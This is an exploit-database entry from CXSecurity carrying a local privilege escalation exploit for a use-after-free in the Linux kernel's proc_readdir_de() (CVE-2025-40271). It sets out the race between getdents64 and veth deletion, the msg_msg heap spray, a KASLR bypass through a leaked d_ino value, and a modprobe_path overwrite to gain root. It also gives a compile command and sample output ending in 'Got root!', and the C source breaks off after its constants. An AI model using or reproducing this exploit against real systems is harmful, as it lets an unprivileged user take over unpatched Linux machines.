---
title: Linux Kernel proc_readdir_de() 6.18-rc5 Local Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2026050001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-04
fetch_date: 2026-05-05T04:56:23.400890
---

# Linux Kernel proc_readdir_de() 6.18-rc5 Local Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Linux Kernel proc\_readdir\_de() 6.18-rc5 Local Privilege Escalation** **2026.05.04**  Credit:  **[Aviral Srivastava](https://cxsecurity.com/author/Aviral%2BSrivastava/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-40271](https://cxsecurity.com/cveshow/CVE-2025-40271/ "Click to see CVE-2025-40271")** | **[CVE-2023-3269](https://cxsecurity.com/cveshow/CVE-2023-3269/ "Click to see CVE-2023-3269")** | **[CVE-2023-32233](https://cxsecurity.com/cveshow/CVE-2023-32233/ "Click to see CVE-2023-32233")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

\* Exploit Title: Linux Kernel proc\_readdir\_de() 6.18-rc5 - Local Privilege Escalation
\* CVE: CVE-2025-40271
\* Date: 2026-03-19
\* Exploit Author: Aviral Srivastava
\* Vendor: Linux Kernel (kernel.org)
\* Affected: ~3.14+ through 6.18-rc5 (bug predates version tracking)
\* Fixed in stable: 5.10.247, 6.1.159, 6.12.73, 6.18-rc6
\* Fixed in: commit 895b4c0c79b092d732544011c3cecaf7322c36a1
\* Tested on: Debian Bookworm (kernel 6.1.115-1 x86\_64)
\* Type: Local Privilege Escalation
\* Platform: Linux x86\_64
\* CVSS: ~7.8 (HIGH) — NVD assessment pending
\*
\* ┌──────────────────────────────────────────────────────────────────┐
\* │ N-DAY — THIS VULNERABILITY IS PATCHED. FIX YOUR KERNELS. │
\* └──────────────────────────────────────────────────────────────────┘
\*
\* DESCRIPTION:
\* The proc filesystem's remove\_proc\_entry() calls rb\_erase() to
\* remove a proc\_dir\_entry (pde) from the parent's red-black tree,
\* but does NOT call RB\_CLEAR\_NODE() to mark the node as detached.
\* This leaves stale rb-links in the freed entry, causing
\* RB\_EMPTY\_NODE() to return false.
\*
\* A concurrent proc\_readdir\_de() traversal via getdents64() can
\* find the freed entry through pde\_subdir\_next() → rb\_next(),
\* then dereference its fields (name, namelen, mode, low\_ino) —
\* constituting a use-after-free on struct proc\_dir\_entry.
\*
\* The race is triggered by calling getdents64() on a /proc
\* subdirectory (e.g., /proc/self/net/dev\_snmp6/) while concurrently
\* unregistering network devices, which removes proc entries.
\* The freed proc\_dir\_entry (~192 bytes) resides in a standard
\* kmalloc-192 or kmalloc-256 slab cache, making it sprayable with
\* msg\_msg via msgsnd().
\*
\* TECHNIQUE:
\* Create user namespace for CAP\_NET\_ADMIN. Create veth pairs to
\* populate /proc/self/net/dev\_snmp6/. Race getdents64() against
\* veth deletion. Spray freed kmalloc-192 slots with msg\_msg.
\* Detect UAF via anomalous d\_ino values in getdents64 output.
\* Extract kernel heap address from msg\_msg header pointer leaked
\* through the d\_ino field. Use modprobe\_path overwrite for LPE.
\*
\* RELIABILITY:
\* ~40-60% UAF hit rate per attempt. Typically 3-8 attempts.
\* The pde->name dereference during readdir is the crash risk —
\* mitigated by spraying the name slot with valid pointers.
\* Kernel panic possible (~10% of failed attempts) if spray timing
\* is wrong.
\*
\* MITIGATIONS:
\* KASLR: Bypassed via heap pointer leak through d\_ino
\* SMEP: Not applicable (data-only attack)
\* SMAP: Not applicable (all data in kernel slab)
\* kCFI: Not applicable (modprobe\_path overwrite)
\* SLUB Hardening: Minimal impact (freelist ptr at offset 0 only)
\*
\* FIX:
\* Commit: 895b4c0c79b092d732544011c3cecaf7322c36a1
\* URL: https://git.kernel.org/linus/895b4c0c79b092d732544011c3cecaf7322c36a1
\* Adds pde\_erase() helper that calls RB\_CLEAR\_NODE() after rb\_erase().
\*
\* COMPILATION:
\* gcc -Wall -Wextra -o exploit exploit.c -lpthread -static
\*
\* USAGE:
\* $ ./exploit
\* [\*] CVE-2025-40271 — proc\_readdir\_de() rb-tree UAF
\* [+] Kernel 6.1.115-1 is VULNERABLE
\* [\*] Step 1: Setting up user/net namespace...
\* [+] Namespace ready, CAP\_NET\_ADMIN obtained
\* [\*] Step 2: Creating veth pairs for proc entries...
\* [+] Created 32 veth pairs (/proc/self/net/dev\_snmp6/)
\* [\*] Step 3: Racing getdents vs device removal...
\* [+] UAF hit on attempt 4! Anomalous d\_ino=0xffff88801234abcd
\* [\*] Step 4: Kernel heap leak: 0xffff88801234abcd
\* [\*] Step 5: Computing modprobe\_path address...
\* [+] Got root!
\*
\* REFERENCES:
\* [1] https://nvd.nist.gov/vuln/detail/CVE-2025-40271
\* [2] https://git.kernel.org/linus/895b4c0c79b092d732544011c3cecaf7322c36a1
\* [3] CVE-2023-3269 — StackRot (rb-tree race technique reference)
\* [4] CVE-2023-32233 — nf\_tables msg\_msg spray reference
\*
\* DISCLAIMER:
\* This exploit targets an ALREADY PATCHED vulnerability. It is provided
\* for educational and authorized security research purposes only. The
\* author is not responsible for misuse. Test only on systems you own.
\* ═══════════════════════════════════════════════════════════════════════
\*/
#define \_GNU\_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <arpa/inet.h>
/\* ─── Constants ─────────────────────────────────────────────────────── \*/
#define BANNER \
"═══════════════════════════════════════════════════════════════\n" \
" CVE-2025-40271 — proc\_readdir\_de() rb-tree UAF LPE\n" \
" fs/proc rb\_erase without RB\_CLEAR\_NODE → stale tree links\n" \
" Affected: ~all kernels through 6.18-rc5\n" \
" Author: Aviral Srivastava | N-DAY RESEARCH PoC\n" \
"═══════════════════════════════════════════════════════════════\n"
#define NUM\_VETH\_PAIRS 32 /\* number of veth pairs to create \*/
#define NUM\_SPRAY\_MSGS 256 /\* msg\_msg spray count \*/
#define SPRAY\_BODY\_SIZE 144 /\* 48 header + 144 body = 192 → kmalloc-192 \*/
#define MAX\_RACE\_ATTEMPTS 30 /\* max race iterations \...